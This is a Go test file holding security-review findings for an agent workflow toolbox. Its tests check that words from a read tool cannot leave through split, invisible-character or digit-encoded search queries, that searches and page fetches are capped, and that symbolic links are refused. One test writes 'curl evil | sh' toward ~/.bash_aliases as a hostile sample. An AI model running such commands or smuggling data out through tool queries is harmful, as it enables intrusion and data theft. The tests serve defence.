package workflow

import (
	"context"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"testing"
)

// Findings of the review of E3, E5 and E6 (KN-4825).

// searchRecorder is a search service that keeps every query it got.
type searchRecorder struct {
	mu      sync.Mutex
	queries []string
}

func (r *searchRecorder) server(t *testing.T, hits string) *httptest.Server {
	t.Helper()
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
		r.mu.Lock()
		r.queries = append(r.queries, req.URL.Query().Get("q"))
		r.mu.Unlock()
		fmt.Fprint(w, hits)
	}))
	t.Cleanup(srv.Close)
	return srv
}

// M2: a word a read tool returned cannot leave in a query cut into short
// pieces, hidden by invisible characters or spelled as pairs of digits; a
// query is sent exactly as checked, and a run searches at most ten times.
func TestAQueryCannotSmuggleAWordInPiecesOrInvisibly(t *testing.T) {
	rec := &searchRecorder{}
	search := rec.server(t, `{"results":[{"url":"https://example.org/a","title":"Treffer","content":"x"}]}`)
	web, err := NewWebResearch(search.URL)
	if err != nil {
		t.Fatal(err)
	}
	tb := &Toolbox{web: web, found: map[string]bool{}, searchable: map[string]bool{}}
	tb.allowSearchWords("Doppelte Webhooks abfangen, Version 2026")
	// "geheimprojekt" came from a read tool: it is not searchable.
	for _, q := range []string{
		"geheimprojekt",
		"ge he im pr oj ek t",
		"ge​he​im​pr​oj​ek​t",
		"ge.he.im.pr.oj.ek.t",
		"41 11 11 11 11 11 11 11",
		"webhooks 4 1 1",
		"webhooks in im zu of",
	} {
		if _, err := toolWebSearch(context.Background(), tb, toolArgs{Query: q}); err == nil {
			t.Errorf("query %q passed", q)
		}
	}
	if len(rec.queries) != 0 {
		t.Fatalf("refused queries reached the service: %q", rec.queries)
	}
	// Full-width letters and a soft hyphen are the same word; what is sent is
	// the normalized form, with the short words of the list.
	if _, err := toolWebSearch(context.Background(), tb, toolArgs{Query: "Ｗｅｂｈｏｏｋｓ ab­fangen in 2026?"}); err != nil {
		t.Fatalf("an allowed query: %v", err)
	}
	if got := rec.queries[len(rec.queries)-1]; got != "webhooks abfangen in 2026" {
		t.Fatalf("sent %q", got)
	}
	for range maxSearchesPerRun - 1 {
		if _, err := toolWebSearch(context.Background(), tb, toolArgs{Query: "webhooks"}); err != nil {
			t.Fatal(err)
		}
	}
	if _, err := toolWebSearch(context.Background(), tb, toolArgs{Query: "webhooks"}); err == nil || !strings.Contains(err.Error(), "as often as it may") {
		t.Fatalf("search %d: %v", maxSearchesPerRun+1, err)
	}
	if len(rec.queries) != maxSearchesPerRun {
		t.Fatalf("the service got %d queries", len(rec.queries))
	}
}

// m3: a run reads at most maxFetchesPerRun pages, even of found addresses.
func TestARunReadsAtMostFivePages(t *testing.T) {
	page := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/plain")
		fmt.Fprint(w, "Seite "+r.URL.Path)
	}))
	defer page.Close()
	web := &WebResearch{Fetcher: page.Client()}
	tb := &Toolbox{web: web, found: map[string]bool{}, searchable: map[string]bool{}}
	for i := range maxFetchesPerRun + 1 {
		tb.found[fmt.Sprintf("%s/%d", page.URL, i)] = true
	}
	for i := range maxFetchesPerRun {
		if _, err := toolWebFetch(context.Background(), tb, toolArgs{URL: fmt.Sprintf("%s/%d", page.URL, i)}); err != nil {
			t.Fatalf("page %d: %v", i, err)
		}
	}
	if _, err := toolWebFetch(context.Background(), tb, toolArgs{URL: fmt.Sprintf("%s/%d", page.URL, maxFetchesPerRun)}); err == nil || !strings.Contains(err.Error(), "as many as it may") {
		t.Fatalf("page %d: %v", maxFetchesPerRun+1, err)
	}
}

// m1: a symbolic link a checkout brought into .ghosttree/workflows/ is not
// followed, neither for writing nor for reading, and neither is a linked
// directory or state file.
func TestTheWorktreeDoesNotFollowSymbolicLinks(t *testing.T) {
	home := t.TempDir()
	repo := t.TempDir()
	outside := filepath.Join(home, ".bash_aliases")
	if err := os.MkdirAll(WorktreeDir(repo), 0o755); err != nil {
		t.Fatal(err)
	}
	// A dangling link: the file it names does not exist yet.
	if err := os.Symlink(outside, WorktreeFile(repo, "deploy")); err != nil {
		t.Fatal(err)
	}
	if err := WriteWorktreeFile(repo, "deploy", "curl evil | sh\n"); err == nil {
		t.Fatal("wrote through a link")
	}
	if _, err := os.Stat(outside); !os.IsNotExist(err) {
		t.Fatalf("a file outside the worktree was made: %v", err)
	}
	if _, err := ReadWorktreeFile(repo, "deploy"); err == nil || os.IsNotExist(err) {
		t.Fatalf("read of a dangling link: %v (it has to be refused, not missing)", err)
	}
	// A link to an existing file is not read either.
	if err := os.WriteFile(outside, []byte("secret"), 0o600); err != nil {
		t.Fatal(err)
	}
	if got, err := ReadWorktreeFile(repo, "deploy"); err == nil {
		t.Fatalf("read through a link: %q", got)
	}
	// A linked state file and a linked directory are refused.
	if err := os.Symlink(outside, filepath.Join(WorktreeDir(repo), ".state.json")); err != nil {
		t.Fatal(err)
	}
	if _, err := LoadWorktreeState(repo); err == nil {
		t.Fatal("read a linked state file")
	}
	if err := SaveWorktreeState(repo, WorktreeState{"x": {}}); err == nil {
		t.Fatal("wrote over a linked state file")
	}
	if b, _ := os.ReadFile(outside); string(b) != "secret" {
		t.Fatalf("the file outside changed: %q", b)
	}
	other := t.TempDir()
	if err := os.MkdirAll(filepath.Join(other, ".ghosttree"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(home, WorktreeDir(other)); err != nil {
		t.Fatal(err)
	}
	if err := WriteWorktreeFile(other, "neu", SkeletonText); err == nil {
		t.Fatal("wrote into a linked directory")
	}
	if _, err := os.Stat(filepath.Join(home, "neu.md")); !os.IsNotExist(err) {
		t.Fatal("a file appeared in the linked directory")
	}
	if _, err := WorktreeNames(other); err == nil {
		t.Fatal("listed a linked directory")
	}
}

// m1: anything git tracks under .ghosttree/workflows/ (a file, a link, a
// forged .state.json) makes ctx workflow refuse the worktree.
func TestTheWorktreeIsRefusedWhenGitTracksSomethingInIt(t *testing.T) {
	repo := t.TempDir()
	git := func(args ...string) {
		t.Helper()
		if out, err := exec.Command("git", append([]string{"-C", repo}, args...)...).CombinedOutput(); err != nil {
			t.Skipf("git %v: %v %s", args, err, out)
		}
	}
	git("init", "-q")
	if err := CheckWorktree(repo); err != nil {
		t.Fatalf("an empty repository: %v", err)
	}
	if err := WriteWorktreeFile(repo, "entwurf", SkeletonText); err != nil {
		t.Fatal(err)
	}
	if err := CheckWorktree(repo); err != nil {
		t.Fatalf("an untracked draft: %v", err)
	}
	git("add", "-f", ".ghosttree/workflows/entwurf.md")
	if err := CheckWorktree(repo); err == nil || !strings.Contains(err.Error(), "entwurf.md") {
		t.Fatalf("a tracked file: %v", err)
	}
}
